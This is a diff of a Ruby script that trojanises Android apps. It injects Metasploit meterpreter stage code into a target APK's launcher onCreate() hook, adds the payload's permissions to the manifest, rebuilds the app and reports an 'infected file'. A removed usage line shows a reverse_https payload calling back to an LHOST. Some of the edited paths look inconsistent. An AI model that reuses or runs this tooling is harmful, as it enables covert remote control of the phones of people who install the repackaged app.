@@ -39,7 +39,7 @@ end
 # pick the injection point
 def scrapeFilesForLauncherActivity()
 	smali_files||=[]
-	Dir.glob('output/original/smali*/**/*.smali') do |file|
+	Dir.glob('temp/original/smali*/**/*.smali') do |file|
 	  checkFile=File.read(file)
 	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
 		smali_files << file
@@ -77,7 +77,7 @@ def fix_manifest()
 	payload_permissions=[]
 
 	#Load payload's permissions
-	File.open("output/payload/AndroidManifest.xml","r"){|file|
+	File.open("temp/payload/AndroidManifest.xml","r"){|file|
 		k=File.read(file)
 		payload_manifest=Nokogiri::XML(k)
 		permissions = payload_manifest.xpath("//manifest/uses-permission")
@@ -89,9 +89,9 @@ def fix_manifest()
 	}
 	original_permissions=[]
 	apk_mani=''
-
-	#Load original apk's permissions
-	File.open("output/original/AndroidManifest.xml","r"){|file2|
+        
+        #Load original apk's permissions
+	File.open("temp/original/AndroidManifest.xml","r"){|file2|
 		k=File.read(file2)
 		apk_mani=k
 		original_manifest=Nokogiri::XML(k)
@@ -124,7 +124,7 @@ def fix_manifest()
 			new_mani << line+"\n"
 		end
 	end
-	File.open("output/original/AndroidManifest.xml", "w") {|file| file.puts new_mani }
+	File.open("temp/original/AndroidManifest.xml", "w") {|file| file.puts new_mani }
 end
 
 apkfile = ARGV[0]
@@ -152,43 +152,20 @@ unless(apk_v.split()[1].include?("v2."))
 	exit(1)
 end
 
-begin
-	msfvenom_opts = ARGV[1,ARGV.length]
-	opts=""
-	msfvenom_opts.each{|x|
-	opts+=x
-	opts+=" "
-	}
-rescue
-	puts "Usage: #{$0} [target.apk] [msfvenom options]\n"
-	puts "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
-	puts "[-] Error parsing msfvenom options. Exiting.\n"
-	exit(1)
-end
-
-
-
-print "[*] Generating msfvenom payload..\n"
-res=`msfvenom -f raw #{opts} -o output/payload.apk `
-if res.downcase.include?("invalid" || "error")
-	puts res
-	exit(1)
-end
-
 print "[*] Signing payload..\n"
-`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA 'output/payload.apk' androiddebugkey`
+`jarsigner -verbose -keystore temp/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA 'temp/payload.apk' androiddebugkey`
 
-`rm -rf output/original`
-`rm -rf output/payload`
+`rm -rf temp/original`
+`rm -rf temp/payload`
 
-`cp #{apkfile} output/original.apk`
+`cp #{apkfile} temp/original.apk`
 
 print "[*] Decompiling original APK..\n"
-`apktool d output/original.apk -o output/original`
+`apktool d temp/app.apk -o temp/original`
 print "[*] Decompiling payload APK..\n"
-`apktool d output/payload.apk -o output/payload`
+`apktool d temp/payload.apk -o temp/payload`
 
-f = File.open("output/original/AndroidManifest.xml")
+f = File.open("temp/original/AndroidManifest.xml")
 amanifest = Nokogiri::XML(f)
 f.close
 
@@ -196,7 +173,7 @@ print "[*] Locating onCreate() hook..\n"
 
 
 launcheractivity = findlauncheractivity(amanifest)
-smalifile = 'output/original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
+smalifile = 'temp/original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
 begin
 	activitysmali = File.read(smalifile)
 rescue Errno::ENOENT
@@ -212,8 +189,8 @@ rescue Errno::ENOENT
 end
 
 print "[*] Copying payload files..\n"
-FileUtils.mkdir_p('output/original/smali/com/metasploit/stage/')
-FileUtils.cp Dir.glob('output/payload/smali/com/metasploit/stage/Payload*.smali'), 'output/original/smali/com/metasploit/stage/'
+FileUtils.mkdir_p('temp/original/smali/com/metasploit/stage/')
+FileUtils.cp Dir.glob('temp/payload/smali/com/metasploit/stage/Payload*.smali'), 'temp/original/smali/com/metasploit/stage/'
 activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
 payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
@@ -226,8 +203,6 @@ print "[*] Poisoning the manifest with meterpreter permissions..\n"
 fix_manifest()
 
 print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"
-`apktool b -o output/#{injected_apk} output/original`
-print "[*] Signing #{injected_apk} ..\n"
-`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey`
+`apktool b -o #{injected_apk} temp/original`
 
 puts "[+] Infected file #{injected_apk} ready.\n"
